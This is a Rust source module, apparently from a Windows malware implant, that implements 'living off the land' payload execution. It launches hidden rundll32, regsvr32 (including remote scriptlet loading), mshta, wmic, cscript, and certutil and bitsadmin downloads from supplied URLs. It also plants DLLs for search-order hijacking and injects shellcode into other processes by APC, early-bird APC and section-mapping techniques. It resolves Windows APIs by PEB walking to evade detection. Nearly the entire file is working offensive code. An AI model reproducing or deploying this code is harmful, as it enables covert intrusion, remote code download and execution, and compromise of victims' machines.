//! Phase 3: Techniques LotL (Living off the Land) alternatives.
//! Utilise des binaires Microsoft legitimes pour l execution du payload.

#![allow(non_snake_case, dead_code)]

use std::{ffi::OsStr, mem, os::windows::ffi::OsStrExt, path::Path, ptr};

fn wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(Some(0)).collect()
}

unsafe fn dyn_create_file_w(nul_name: *const u16) -> *mut std::ffi::c_void {
    let k32 = crate::syscall::get_module_base(crate::stealth::stealth_dll_name(0)).unwrap_or(ptr::null_mut());
    let addr = crate::syscall::resolve_export(k32, "CreateFileW").unwrap_or(ptr::null_mut());
    if addr.is_null() { return ptr::null_mut(); }
    type FnCreateFileW = unsafe extern "system" fn(*const u16, u32, u32, *mut std::ffi::c_void, u32, u32, *mut std::ffi::c_void) -> *mut std::ffi::c_void;
    let f: FnCreateFileW = mem::transmute(addr);
    f(nul_name, 0x40000000, 0x00000001, ptr::null_mut(), 3, 0x00000080, ptr::null_mut())
}

unsafe fn dyn_close_handle(h: *mut std::ffi::c_void) {
    let k32 = crate::syscall::get_module_base(crate::stealth::stealth_dll_name(0)).unwrap_or(ptr::null_mut());
    let addr = crate::syscall::resolve_export(k32, "CloseHandle").unwrap_or(ptr::null_mut());
    if addr.is_null() { return; }
    type FnCloseHandle = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
    let f: FnCloseHandle = mem::transmute(addr);
    f(h);
}

/// LotL #1: rundll32.exe
pub fn lotl_via_rundll32(dll_path: &Path, export_name: &str) -> Result<(), ()> {
    let dll_str = dll_path.to_string_lossy();
    let cmd = format!("rundll32.exe \"{}\",{}", dll_str, export_name);
    run_process(&cmd)
}

/// LotL #2: regsvr32.exe
pub fn lotl_via_regsvr32(dll_path: &Path) -> Result<(), ()> {
    let dll_str = dll_path.to_string_lossy();
    let cmd = format!("regsvr32.exe /s \"{}\"", dll_str);
    run_process(&cmd)
}

/// LotL #3: regsvr32 Squiblydoo
pub fn lotl_via_regsvr32_remote(script_url: &str) -> Result<(), ()> {
    let cmd = format!("regsvr32.exe /s /u /i:{} scrobj.dll", script_url);
    run_process(&cmd)
}

/// LotL #4: mshta.exe
pub fn lotl_via_mshta(hta_content: &str) -> Result<(), ()> {
    #[allow(deprecated)]
    let encoded = urlencode(hta_content);
    let cmd = format!("mshta.exe \"javascript:{}\"", encoded);
    run_process(&cmd)
}

/// LotL #5: wmic.exe
pub fn lotl_via_wmic(payload_path: &Path) -> Result<(), ()> {
    let p = payload_path.to_string_lossy();
    let cmd = format!("wmic.exe process call create \"{}\"", p);
    run_process(&cmd)
}

/// LotL #6: cscript.exe
pub fn lotl_via_cscript(script_path: &Path) -> Result<(), ()> {
    let s = script_path.to_string_lossy();
    let cmd = format!("cscript.exe //B //NoLogo \"{}\"", s);
    run_process(&cmd)
}

/// LotL #7: Certutil
pub fn lotl_via_certutil(url: &str, output_path: &Path) -> Result<(), ()> {
    let out = output_path.to_string_lossy();
    let cmd = format!("certutil.exe -urlcache -split -f \"{}\" \"{}\"", url, out);
    run_process(&cmd)
}

/// LotL #8: Bitsadmin
pub fn lotl_via_bitsadmin(url: &str, output_path: &Path) -> Result<(), ()> {
    let out = output_path.to_string_lossy();
    let cmd = format!(
        "bitsadmin.exe /transfer \"UpdaterTask\" /download /priority high \"{}\" \"{}\"",
        url, out
    );
    run_process(&cmd)
}

/// LotL #9: DLL Search Order Hijacking
pub fn lotl_dll_hijack(target_dir: &Path, legit_dll_name: &str, payload_bytes: &[u8]) -> Result<(), ()> {
    let hijack_path = target_dir.join(legit_dll_name);
    std::fs::write(&hijack_path, payload_bytes).map_err(|_| ())?;
    Ok(())
}

/// LotL #10: APC Injection (via QueueUserAPC resolved from kernel32 export table)
pub unsafe fn lotl_apc_injection(
    thread_handle: *mut std::ffi::c_void,
    shellcode_addr: *mut std::ffi::c_void,
) -> Result<(), ()> {
    // Resolve QueueUserAPC from kernel32 via PEB walking (no GetProcAddress)
    let kernel32 = crate::syscall::get_module_base(crate::stealth::stealth_dll_name(0)).ok_or(())?;
    let queue_apc = crate::syscall::resolve_export(kernel32, "QueueUserAPC").ok_or(())?;
    type QueueUserAPCFn = extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, usize) -> u32;
    let func: QueueUserAPCFn = mem::transmute(queue_apc);
    let result = func(shellcode_addr, thread_handle, 0);
    if result != 0 { Ok(()) } else { Err(()) }
}

/// Helper: execute une commande via CreateProcessW en silence
fn run_process(cmdline: &str) -> Result<(), ()> {
    let mut cmd_w: Vec<u16> = OsStr::new(cmdline).encode_wide().chain(Some(0)).collect();

    #[repr(C)]
    struct STARTUPINFOW {
        cb: u32,
        _reserved1: *mut u16,
        _desktop: *mut u16,
        _title: *mut u16,
        dwX: u32,
        dwY: u32,
        dwXSize: u32,
        dwYSize: u32,
        dwXCountChars: u32,
        dwYCountChars: u32,
        dwFillAttribute: u32,
        dwFlags: u32,
        wShowWindow: u16,
        _reserved2: u16,
        _reserved3: *mut u8,
        hStdInput: *mut std::ffi::c_void,
        hStdOutput: *mut std::ffi::c_void,
        hStdError: *mut std::ffi::c_void,
    }

    #[repr(C)]
    struct PROCESS_INFORMATION {
        hProcess: *mut std::ffi::c_void,
        hThread: *mut std::ffi::c_void,
        dwProcessId: u32,
        dwThreadId: u32,
    }

    unsafe {
        let mut si: STARTUPINFOW = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        si.dwFlags = 0x0000_0100;
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        let nul_name: Vec<u16> = "NUL\0".encode_utf16().collect();
        let nul = dyn_create_file_w(nul_name.as_ptr());
        si.hStdInput = nul;
        si.hStdOutput = nul;
        si.hStdError = nul;

        crate::dynapi::CreateProcessW(
            std::ptr::null(),
            cmd_w.as_mut_ptr(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            1,
            0x0800_0000,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut si as *mut _ as *mut std::ffi::c_void,
            &mut pi as *mut _ as *mut std::ffi::c_void,
        );

        dyn_close_handle(nul);
        dyn_close_handle(pi.hThread);
        crate::dynapi::WaitForSingleObject(pi.hProcess, 5000);
        dyn_close_handle(pi.hProcess);
    }
    Ok(())
}

/// Simple URL encoding helper
fn urlencode(s: &str) -> String {
    let mut result = String::new();
    for byte in s.bytes() {
        match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                result.push(byte as char);
            }
            _ => {
                result.push_str(&format!("%{:02X}", byte));
            }
        }
    }
    result
}

pub unsafe fn process_ghosting_injection(pid: u32, shellcode: &[u8]) -> Result<(), ()> {
    let target_proc = crate::syscall::nt_open_process(pid, 0x0043)?;
    let mut section_handle: *mut std::ffi::c_void = ptr::null_mut();
    let mut max_size: u64 = shellcode.len() as u64;
    if crate::syscall::nt_create_section(
        &mut section_handle,
        0xF001F,
        ptr::null_mut(),
        &mut max_size,
        0x40,
        0x8000000,
        ptr::null_mut(),
    ).is_err() {
        return Err(());
    }

    let mut base_addr: *mut std::ffi::c_void = ptr::null_mut();
    let mut view_size: usize = shellcode.len();
    if crate::syscall::nt_map_view_of_section(
        section_handle,
        target_proc,
        &mut base_addr,
        0,
        shellcode.len(),
        ptr::null_mut(),
        &mut view_size,
        2,
        0,
        0x40,
    ).is_err() {
        return Err(());
    }

    if crate::syscall::nt_write_virtual_memory(target_proc, base_addr, shellcode).is_err() {
        return Err(());
    }

    if let Ok(thread) = crate::syscall::nt_create_thread_ex(target_proc, base_addr, ptr::null_mut()) {
        let _ = crate::syscall::nt_close(thread);
    }
    let _ = crate::syscall::nt_close(target_proc);
    let _ = crate::syscall::nt_close(section_handle);
    Ok(())
}

pub unsafe fn early_bird_apc_injection(pid: u32, shellcode: &[u8]) -> Result<(), ()> {
    let target_proc = crate::syscall::nt_open_process(pid, 0x0043)?;
    let mut mem_remote = match crate::syscall::nt_allocate_virtual_memory(target_proc, shellcode.len(), 0x40) {
        Ok(addr) => addr,
        Err(_) => {
            let _ = crate::syscall::nt_close(target_proc);
            return Err(());
        }
    };

    if mem_remote.is_null() {
        let _ = crate::syscall::nt_close(target_proc);
        return Err(());
    }

    if crate::syscall::nt_write_virtual_memory(target_proc, mem_remote, shellcode).is_err() {
        let mut zero = 0usize;
        let _ = crate::syscall::nt_free_virtual_memory(target_proc, &mut mem_remote, &mut zero, 0x8000);
        let _ = crate::syscall::nt_close(target_proc);
        return Err(());
    }

    if let Ok(thread) = crate::syscall::nt_create_thread_ex(target_proc, mem_remote, ptr::null_mut()) {
        let _ = crate::syscall::nt_queue_apc_thread(thread, mem_remote, ptr::null_mut(), ptr::null_mut(), ptr::null_mut());
        let _ = crate::syscall::nt_close(thread);
    }

    let _ = crate::syscall::nt_close(target_proc);
    Ok(())
}
